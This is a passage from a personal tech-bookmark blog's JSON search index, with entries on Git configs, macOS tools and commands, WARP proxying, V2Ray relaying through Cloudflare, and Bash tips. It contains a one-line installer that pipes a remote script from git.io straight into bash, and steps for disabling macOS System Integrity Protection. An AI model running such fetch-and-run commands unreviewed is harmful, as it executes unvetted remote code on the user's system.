\u0026#34;gitdir:~/work/**\u0026#34;]\n  path = ~/.config/git/work\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e\u003ccode\u003ehasconfig:remote.*.url:\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[includeIf \u0026#34;hasconfig:remote.*.url:git@github.com:*/**\u0026#34;]\n  path = ~/.config/git/config-gh\n[includeIf \u0026#34;hasconfig:remote.*.url:git@github.com:orgname/**\u0026#34;]\n  path = ~/.config/git/config-gh-org\n[includeIf \u0026#34;hasconfig:remote.*.url:git@gitlab.com:*/**\u0026#34;]\n  path = ~/.config/git/config-gl\n[includeIf \u0026#34;hasconfig:remote.*.url:git@git.sr.ht:*/**\u0026#34;]\n  path = ~/.config/git/config-srht\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e\u003cem\u003einsteadOf\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[url \u0026#34;gh-work:orgname\u0026#34;]\n  insteadOf = git@github.com:orgname\n\u003c/code\u003e\u003c/pre\u003e","tags":["URL","Git"],"title":"How I configure my Git identities"},{"categories":["URL","Rust"],"contents":" Speeding up the Rust edit-build-run cycle ","date":"November 18, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241118-speeding-up-the-rust-edit-build-run-cycle/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://davidlattimore.github.io/posts/2024/02/04/speeding-up-the-rust-edit-build-run-cycle.html\" target=\"_blank\" rel=\"noopener\"\u003eSpeeding up the Rust edit-build-run cycle\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Rust"],"title":"Speeding up the Rust edit-build-run cycle"},{"categories":["URL","macOS","Software","APP"],"contents":" Mac 小众软件推荐与工作流分享(2024) ","date":"November 14, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241114-mac-app-share/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ursb.me/posts/mac-app-share-2024/\" target=\"_blank\" rel=\"noopener\"\u003eMac 小众软件推荐与工作流分享(2024)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","macOS","Software","APP"],"title":"Mac 小众软件推荐与工作流分享(2024)"},{"categories":["URL","macOS","Security"],"contents":" Objective-See: 一个关于 Apple 设备隐私与安全的开源项目组织 今天搜小工具的时候发现他们做了一堆 macOS 上的开源软件，基本都是和隐私与安全相关的。\nKnockKnock: 查看你的 Mac 上有哪些后台进程、守护进程、启动项、内核扩展、登录项、浏览器插件等等。能看到的比那个「Login Items」详细的多（有的软件通过其他方式自启动）\nLuLu: 一个开源的 macOS 上的网络防火墙，可以让你详细的控制每个软件的网络连接。（类似 Hands Off!）\nTaskExplorer: 一个增强版的任务管理器，可以看到应用的签名、打开的文件、网络连接等等，还可以根据 sha256 自动帮你搜索 VirusTotal 结果。\nDo Not Disturb: 可以阻止你的 Mac 被打扰（没错），当你的 Mac 被别人打开盖子时可以发送警告、执行脚本、检测设备变化之类的。\nBlockBlock: 可以阻止后台的持久化安装，RansomWhere 可以检测文件被加密的行为，还有一些杂七杂八的独立工具。\nhttps://objective-see.org\n","date":"November 13, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241113-objective-see/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://t.me/misakatech/1349\" target=\"_blank\" rel=\"noopener\"\u003eObjective-See: 一个关于 Apple 设备隐私与安全的开源项目组织\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e今天搜小工具的时候发现他们做了一堆 macOS 上的开源软件，基本都是和隐私与安全相关的。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/knockknock.html\" target=\"_blank\" rel=\"noopener\"\u003eKnockKnock\u003c/a\u003e: 查看你的 Mac 上有哪些后台进程、守护进程、启动项、内核扩展、登录项、浏览器插件等等。能看到的比那个「Login Items」详细的多（有的软件通过其他方式自启动）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/lulu.html\" target=\"_blank\" rel=\"noopener\"\u003eLuLu\u003c/a\u003e: 一个开源的 macOS 上的网络防火墙，可以让你详细的控制每个软件的网络连接。（类似 Hands Off!）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/taskexplorer.html\" target=\"_blank\" rel=\"noopener\"\u003eTaskExplorer\u003c/a\u003e: 一个增强版的任务管理器，可以看到应用的签名、打开的文件、网络连接等等，还可以根据 sha256 自动帮你搜索 VirusTotal 结果。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/dnd.html\" target=\"_blank\" rel=\"noopener\"\u003eDo Not Disturb\u003c/a\u003e: 可以阻止你的 Mac 被打扰（没错），当你的 Mac 被别人打开盖子时可以发送警告、执行脚本、检测设备变化之类的。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/blockblock.html\" target=\"_blank\" rel=\"noopener\"\u003eBlockBlock\u003c/a\u003e: 可以阻止后台的持久化安装，RansomWhere 可以检测文件被加密的行为，还有一些杂七杂八的独立工具。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org\" target=\"_blank\" rel=\"noopener\"\u003ehttps://objective-see.org\u003c/a\u003e\u003c/p\u003e","tags":["URL","macOS","Security"],"title":"Objective-See: 一个关于 Apple 设备隐私与安全的开源项目组织"},{"categories":["URL","macOS","command line"],"contents":" Advanced macOS Command-Line Tools Useful built-in macOS command-line utilities 苹果：为了安全让 M2 吃灰 sips - image manipulation sips -z \u0026lt;height\u0026gt; \u0026lt;width\u0026gt; \u0026lt;image\u0026gt; resizes the specified image, ignoring the previous aspect ratio.\nsips -Z \u0026lt;size\u0026gt; \u0026lt;image\u0026gt; resizes the largest side of the specified image, preserving the aspect ratio.\nsips -c \u0026lt;height\u0026gt; \u0026lt;width\u0026gt; \u0026lt;image\u0026gt; crops the specified image to the given dimensions (relative to the center of the original image).\nsips -r \u0026lt;degrees\u0026gt; \u0026lt;image\u0026gt; rotates the image by the specified degrees.\nBy default, sips will destructively overwrite the input image. Use the -o flag to specify a different output file path (which must have the same file extension as the input image).\ntextutil - document file converter textutil can convert files to and from Microsoft Word, plain text, rich text, and HTML formats.\ntextutil -convert html journal.doc converts journal.doc into journal.html.\nThe possible values for -convert are: txt, html, rtf, rtfd, doc, docx.\npmset - configure power management pmset -g prints all available power configuration information.\npmset -g assertions displays information about power-related assertions made by other processes. This can be useful for finding a process that is preventing your Mac from going to sleep.\npmset -g thermlog displays information about any processes that have been throttled (useful when running benchmarks).\npmset displaysleepnow immediately puts the display to sleep without putting the rest of the system to sleep.\npmset sleepnow immediately puts the entire system to sleep.\nSIP 是什么？ 这东西全称 System Integrity Protection，译为系统完整性保护\nSIP 是 OS X El Capitan 时开始采用的一项安全技术，目的是为了限制 root 账户对系统的完全控制权，也叫 Rootless 保护机制。从文档看出，苹果自家的 Xcode 系统是做了特殊处理的，但第三方软件需要经过 SIP 的检查。\n简而言之 SIP 会在我们跑任软件之前，把你的执行文件做一个校验和，然后通过网络请求发送到让人敬畏的苹果服务器，就是为了检测是否是恶意软件！\n如果你想关闭 SIP，还有那么点麻烦：\n重启 Mac，按住 Command + R 直到屏幕上出现苹果的标志和进度条，进入 Recovery 模式。(如果是新的 Mac 就在启动的时候长按住电源键) 在屏幕上方的工具栏找到并打开终端，输入命令 csrutil disable ； 关掉终端，重启 Mac； 重启以后可以在终端中查看状态确认。 一个读者指出了更简单的办法，把你信任的工具加入到 Developer Tools(必须通过 UI 设置) Setting ==\u0026gt; Privacy \u0026amp; Security ==\u0026gt; Developer Tools\n","date":"November 13, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241113-advanced-macos-commands/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://saurabhs.org/advanced-macos-commands\" target=\"_blank\" rel=\"noopener\"\u003eAdvanced macOS Command-Line Tools\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://weiyen.net/articles/useful-macos-cmd-line-utilities/\" target=\"_blank\" rel=\"noopener\"\u003eUseful built-in macOS command-line utilities\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://catcoding.me/p/apple-perf/\" target=\"_blank\" rel=\"noopener\"\u003e苹果：为了安全让 M2 吃灰\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"sips---image-manipulation\"\u003esips - image manipulation\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003esips -z \u0026lt;height\u0026gt; \u0026lt;width\u0026gt; \u0026lt;image\u0026gt;\u003c/code\u003e resizes the specified image, ignoring the previous aspect ratio.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esips -Z \u0026lt;size\u0026gt; \u0026lt;image\u0026gt;\u003c/code\u003e resizes the largest side of the specified image, preserving the aspect ratio.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esips -c \u0026lt;height\u0026gt; \u0026lt;width\u0026gt; \u0026lt;image\u0026gt;\u003c/code\u003e crops the specified image to the given dimensions (relative to the center of the original image).\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esips -r \u0026lt;degrees\u0026gt; \u0026lt;image\u0026gt;\u003c/code\u003e rotates the image by the specified degrees.\u003c/p\u003e","tags":["URL","macOS","command line"],"title":"Advanced macOS Command-Line Tools"},{"categories":["URL","HomeLab"],"contents":" 工欲善其事，必先利其器 —— 我的家庭网络组网方案 ","date":"November 11, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241111-home-network-setup/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.skk.moe/post/home-network-setup/\" target=\"_blank\" rel=\"noopener\"\u003e工欲善其事，必先利其器 —— 我的家庭网络组网方案\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","HomeLab"],"title":"工欲善其事，必先利其器 —— 我的家庭网络组网方案"},{"categories":["URL","Cloudflare"],"contents":" 把 Cloudflare WARP 转换为 http 代理 warp-cli proxy port 60606 warp-cli mode proxy 然而，Go 的程序不支持 socks 代理，要手动加 transport 我可没那个功夫去加。\n好消息是，Go 默认是尊重环境变量 http_proxy 的。那么就要想办法给 socks 代理转换为 http 代理\npproxy -v -l http://127.0.0.1:8118 -r socks5://127.0.0.1:60606 https_proxy=http://127.0.0.1:8118 http_proxy=http://127.0.0.1:8118 curl ipv4.win curl: (52) Empty reply from server # pproxy logs Serving on ipv? 127.0.0.1:8118 by http http 127.0.0.1:45012 -\u0026gt; socks5 127.0.0.1:60606 -\u0026gt; ipv4.win:80 Unknown remote protocol from 127.0.0.1 可能是 pproxy 的问题，那么用 gost\ngost -L http://127.0.0.1:8118 -F socks5://127.0.0.1:60606 2024/11/03 12:32:43 route.go:700: http://127.0.0.1:8118 on 127.0.0.1:8118 2024/11/03 12:32:46 http.go:162: [http] 127.0.0.1:33284 -\u0026gt; http://127.0.0.1:8118 -\u0026gt; ipv4.win:80 2024/11/03 12:32:46 http.go:257: [route] 127.0.0.1:33284 -\u0026gt; http://127.0.0.1:8118 -\u0026gt; 1@socks5://127.0.0.1:60606 -\u0026gt; ipv4.win:80 2024/11/03 12:32:46 http.go:280: [http] 127.0.0.1:33284 -\u0026gt; 127.0.0.1:8118 : unexpected EOF 那……Privoxy\nforward-socks5 / 127.0.0.1:60606 . 偶然取消 DNS 请求的勾选，就成功了…… 突然恍然大悟，WARP 可能不支持远程解析 DNS\n要么用回 socks4 pproxy -v -l http://127.0.0.1:8118 -r socks4://127.0.0.1:60606 gost -L http://127.0.0.1:8118 -F socks4://127.0.0.1:60606 要么给加上 DNS 的支持: gost -L \u0026quot;http://127.0.0.1:8118?dns=1.1.1.1\u0026quot; -F socks5://127.0.0.1:60606 需要注意：warp-cli 的 proxy mode 不支持超过 10 秒的连接\n遇到这种情况，要么不用 proxy mode， 要么在 gost 或 pproxy 那边绕过\ngost -L http://127.0.0.1:8118 -F socks4://127.0.0.1:60606?bypass=api.openai.com\n","date":"November 6, 2024","hero":"/images/hero/cloudflare.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241106-warp-http-proxy/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dmesg.app/warp-http-proxy.html\" target=\"_blank\" rel=\"noopener\"\u003e把 Cloudflare WARP 转换为 http 代理\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewarp-cli proxy port \u003cspan style=\"color:#ae81ff\"\u003e60606\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewarp-cli mode proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然而，Go 的程序不支持 socks 代理，要手动加 transport 我可没那个功夫去加。\u003c/p\u003e\n\u003cp\u003e好消息是，Go 默认是尊重环境变量 http_proxy 的。那么就要想办法给 socks 代理转换为 http 代理\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epproxy -v -l http://127.0.0.1:8118 -r socks5://127.0.0.1:60606\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehttps_proxy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ehttp://127.0.0.1:8118 http_proxy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ehttp://127.0.0.1:8118 curl ipv4.win\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e52\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e Empty reply from server\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# pproxy logs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eServing on ipv? 127.0.0.1:8118 by http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehttp 127.0.0.1:45012 -\u0026gt; socks5 127.0.0.1:60606 -\u0026gt; ipv4.win:80\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUnknown remote protocol from 127.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可能是 pproxy 的问题，那么用 gost\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egost -L http://127.0.0.1:8118 -F socks5://127.0.0.1:60606\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2024/11/03 12:32:43 route.go:700: http://127.0.0.1:8118 on 127.0.0.1:8118\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2024/11/03 12:32:46 http.go:162: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ehttp\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e 127.0.0.1:33284 -\u0026gt; http://127.0.0.1:8118 -\u0026gt; ipv4.win:80\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2024/11/03 12:32:46 http.go:257: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eroute\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e 127.0.0.1:33284 -\u0026gt; http://127.0.0.1:8118 -\u0026gt; 1@socks5://127.0.0.1:60606 -\u0026gt; ipv4.win:80\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2024/11/03 12:32:46 http.go:280: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ehttp\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e 127.0.0.1:33284 -\u0026gt; 127.0.0.1:8118 : unexpected EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那……Privoxy\u003c/p\u003e","tags":["URL","Cloudflare"],"title":"把 Cloudflare WARP 转换为 http 代理"},{"categories":["URL","V2Ray","Network","Proxy"],"contents":" 使用 Cloudflare 中转 V2Ray 流量 最好用的 V2Ray 一键安装脚本 V2Ray 脚本 DNS 设置 V2Ray 脚本中转教程 安装脚本 bash \u0026lt;(wget -qO- -o- https://git.io/v2ray.sh) 准备 我们现在就添加一个 DNS 记录，名称：ai，IPv4 地址：写你的 VPS IP，代理状态必须关闭，云朵图标为灰色。\n提示：你可以使用 v2ray ip 查看你的 VPS IP。\n添加中转配置 使用 v2ray add ws ai.233boy.com 添加一个 vmess-ws-tls 配置；记得把 ai.233boy.com 改成你的域名\n就是刚才添加记录的那个域名，假设你的域名是 233boy.com ，添加的名称是 ai，域名就是 ai.233boy.com\n开启中转 在 Cloudflare 后台主页，点击你的域名进去，在左侧选项菜单选择 SSL/TLS\n将 SSL/TLS 加密模式更改为 完全\n然后在左侧选项菜单选择 DNS\n编辑添加的那个记录，把代理状态打开，即是 已代理，云朵图标为点亮状态，然后保存\n把云朵点亮之后，流量就是走的 Cloudflare 中转了。\n提醒，把云朵点亮就是流量通过 Cloudflare 中转，点灰云朵图标就是直连，不走 Cloudflare 中转。\n获取真实客户端 IP 考虑到有些人会有某些特殊需求，因为套 CF 了默认情况在查看日志的时候会显示客户端 IP 是 CF 的。\n如果你需要获取真实的客户端 IP，得更改一下 Caddy 的配置\n在 /etc/caddy/233boy/xxx.conf 找到你的 caddy 配置文件，（xxx 指的是你的域名）\n默认配置类似如下：\nxxx:443 { reverse_proxy /56f7be67-809f-4f47-8cae-9bffa908adf5 127.0.0.1:2333 import /etc/caddy/233boy/xxx.conf.add } 最终更改的配置如下：\nxxx:443 { reverse_proxy /56f7be67-809f-4f47-8cae-9bffa908adf5 127.0.0.1:2333 { header_up X-Real-IP {header.CF-Connecting-IP} header_up X-Forwarded-For {header.CF-Connecting-IP} } import /etc/caddy/233boy/xxx.conf.add } 原则上，你仅需要更改增加一下 header_up 选项指定 IP 为 CF 转发就好了，\n改好了要重启一下 Caddy：v2ray restart caddy\nDNS 输入 v2ray dns 即可选择相关 DNS\n请选择 DNS: 1) 1.1.1.1 2) 8.8.8.8 3) https://dns.google/dns-query 4) https://cloudflare-dns.com/dns-query 5) https://family.cloudflare-dns.com/dns-query 6) set 7) none 请选择 [1-7]: 备注，https 开头的即是使用 DOH 方式，使用 DOH 方式默认开启本地查询，即是 DOH 本地模式 (DOHL)\nset 选项是可以自定义 DNS，\nnone 选项是不配置任何 DNS\ngoogle 快速设置 Google DNS: v2ray dns 88\n快速设置 Google DNS DOH: v2ray dns gg\ncloudflare 快速设置 Cloudflare DNS: v2ray dns 11\n快速设置 Cloudflare DNS DOH: v2ray dns cf\nnosex 快速设置 Cloudflare Family DNS DOH: v2ray dns nosex\n备注，使用此方式，将无法打开小电影网站（提供给有特殊需求的时候使用\nset 快速自定义 DNS 使用 9.9.9.9：v2ray dns set 9.9.9.9\n快速自定义使用 ADGUARD DNS DOH：v2ray dns set https://dns.adguard-dns.com/dns-query\n使用 v2ray dns set 可以手动输入 DNS 值，\n或者 v2ray dns set 1.1.1.1 直接指定使用 1.1.1.1 作为 DNS，后面的 1.1.1.1 可以自定义成任何你喜欢的 DNS\nnone 如果你出现任何问题，请使用 v2ray dns none 来重置 DNS 配置\n或者如果你想要 V2Ray 走系统 DNS，也使用此命令\n利用 Dokodemo-door 进行转发 假设你有 A-B 两台 VPS，打算使用 A 机器转发流量到 B 机器。\n常见的用途是国内连接到 A 机器的网络比较好，然后希望通过 A 机器转发数据到 B 机器，再通过 B 机器干坏事（\n又或者是 B 机器可以解锁一些在线服务之类，但是直连效果不好，甚至 IP 都被墙了，想要使用 A 机器做前置转发。\n缺点是，只能转发 TCP 或 UDP 流量，带 TLS 的不行\n添加配置 先在 B 机器添加一个 V2Ray 配置，举例： v2ray add tcp 233\n这样来就是添加了一个 VMESS-TCP 的配置，并且端口是 233\n如果你已经有配置就不用再添加了，反正记下 B 机器的 IP 和配置的 端口 即可\n因为利用 A 机器转发的时候必须要填写上 B 机器的 IP，以及要转到到 B 机器的哪个端口\ndoor 使用方法： v2ray add door [port] [remote-addr] [remote-port]\n在 A 机器执行：v2ray add door，然后输入 B 机器的 IP 和端口\n默认情况下 V2Ray 脚本会随机生成一个端口，如果你需要自定义端口请使用 v2ray add door 需要自定义的端口\n测试 把 B 机器给出的配置里面的地址和端口，改成 A 机器的 IP 和端口即可\n就是 B 机器的配置，假设你用 v2rayN 通过 URL 导入了配置，把配置的地址和端口改成 A 机器的 IP 和 Dokodemo-door 端口。\n看看是不是能使用了？\n一键添加 快速添加一个中转配置：\nv2ray add door 233 b.233boy.com 443\n解释：添加一个 Dokodemo-door 配置，端口 233，目标地址 b.233boy.com，目标端口 443。\n是的，目标地址你也可以使用域名。\n机智如我 虽然说上面的例子是来中转 V2Ray 配置使用，但是你也可以做一下跳板机，用来搞一下骚操作\n比如说，转发数据到 1.1.1.1 DNS：v2ray add door 53 1.1.1.1 53，这样来就是你的 53 端口也可以做 DNS 啦\n至于其他的操作，自行发挥！\n","date":"October 22, 2024","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241022-v2ray-cloudflare/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://233boy.com/v2ray/v2ray-cloudflare/\" target=\"_blank\" rel=\"noopener\"\u003e使用 Cloudflare 中转 V2Ray 流量\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://233boy.com/v2ray/v2ray-script/\" target=\"_blank\" rel=\"noopener\"\u003e最好用的 V2Ray 一键安装脚本\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://233boy.com/v2ray/v2ray-dns/\" target=\"_blank\" rel=\"noopener\"\u003eV2Ray 脚本 DNS 设置\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://233boy.com/v2ray/v2ray-dokodemo-door/\" target=\"_blank\" rel=\"noopener\"\u003eV2Ray 脚本中转教程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"安装脚本\"\u003e安装脚本\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebash \u0026lt;\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ewget -qO- -o- https://git.io/v2ray.sh\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"准备\"\u003e准备\u003c/h2\u003e\n\u003cp\u003e我们现在就添加一个 DNS 记录，名称：\u003ccode\u003eai\u003c/code\u003e，IPv4 地址：\u003ccode\u003e写你的 VPS IP\u003c/code\u003e，代理状态必须关闭，云朵图标为灰色。\u003c/p\u003e\n\u003cp\u003e提示：你可以使用 \u003ccode\u003ev2ray ip\u003c/code\u003e 查看你的 VPS IP。\u003c/p\u003e\n\u003ch2 id=\"添加中转配置\"\u003e添加中转配置\u003c/h2\u003e\n\u003cp\u003e使用 \u003ccode\u003ev2ray add ws ai.233boy.com\u003c/code\u003e 添加一个 vmess-ws-tls 配置；记得把 \u003ccode\u003eai.233boy.com\u003c/code\u003e 改成你的域名\u003c/p\u003e\n\u003cp\u003e就是刚才添加记录的那个域名，假设你的域名是 233boy.com ，添加的名称是 ai，域名就是 ai.233boy.com\u003c/p\u003e\n\u003ch2 id=\"开启中转\"\u003e开启中转\u003c/h2\u003e\n\u003cp\u003e在 Cloudflare 后台主页，点击你的域名进去，在左侧选项菜单选择 \u003ccode\u003eSSL/TLS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e将 SSL/TLS 加密模式更改为 \u003ccode\u003e完全\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后在左侧选项菜单选择 \u003ccode\u003eDNS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e编辑添加的那个记录，把代理状态打开，即是 \u003ccode\u003e已代理\u003c/code\u003e，云朵图标为点亮状态，然后保存\u003c/p\u003e\n\u003cp\u003e把云朵点亮之后，流量就是走的 Cloudflare 中转了。\u003c/p\u003e\n\u003cp\u003e提醒，把云朵点亮就是流量通过 Cloudflare 中转，点灰云朵图标就是直连，不走 Cloudflare 中转。\u003c/p\u003e","tags":["URL","V2Ray","Network","Proxy"],"title":"使用 Cloudflare 中转 V2Ray 流量"},{"categories":["URL","SHELL","BASH"],"contents":" Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash Use Built-in Commands Built-in commands execute faster because they don\u0026rsquo;t require loading an external process. Minimize Subshells Subshells can be expensive in terms of performance. # Inefficient output=$(cat file.txt) # Efficient output=$(\u0026lt;file.txt) Use Arrays for Bulk Data When handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables. # Inefficient item1=\u0026#34;apple\u0026#34; item2=\u0026#34;banana\u0026#34; item3=\u0026#34;cherry\u0026#34; # Efficient items=(\u0026#34;apple\u0026#34; \u0026#34;banana\u0026#34; \u0026#34;cherry\u0026#34;) for item in \u0026#34;${items[@]}\u0026#34;; do echo \u0026#34;$item\u0026#34; done Enable Noclobber To prevent accidental overwriting of files. set -o noclobber Use Functions Functions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy. Efficient File Operations When performing file operations, use efficient techniques to minimize resource usage. # Inefficient while read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt # Efficient while IFS= read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt Parallel Processing Tools like xargs and GNU parallel can be incredibly useful. Error Handling Robust error handling is critical for creating reliable and maintainable scripts. # Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors. set -e # Custom Error Messages: Implement custom error messages to provide more context when something goes wrong. command1 || { echo \u0026#34;command1 failed\u0026#34;; exit 1; } # Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully. trap \u0026#39;echo \u0026#34;Error occurred\u0026#34;; cleanup; exit 1\u0026#39; ERR function cleanup() { # Cleanup code } # Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior. if [[ -z \u0026#34;$1\u0026#34; ]]; then echo \u0026#34;Usage: $0 \u0026lt;argument\u0026gt;\u0026#34; exit 1 fi # Logging: Implement logging to keep track of script execution and diagnose issues. logfile=\u0026#34;script.log\u0026#34; exec \u0026gt; \u0026gt;(tee -i $logfile) exec 2\u0026gt;\u0026amp;1 echo \u0026#34;Script started\u0026#34; Automating Complex System Administration Tasks: Automated Backups System Monitoring User Management Automated Updates Network Configuration ","date":"September 25, 2024","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240925-advanced-shell-scripting/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://omid.dev/2024/06/19/advanced-shell-scripting-techniques-automating-complex-tasks-with-bash/\" target=\"_blank\" rel=\"noopener\"\u003eAdvanced Shell Scripting Techniques: Automating Complex Tasks with Bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"use-built-in-commands\"\u003eUse Built-in Commands\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eBuilt-in commands execute faster because they don\u0026rsquo;t require loading an external process.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch4 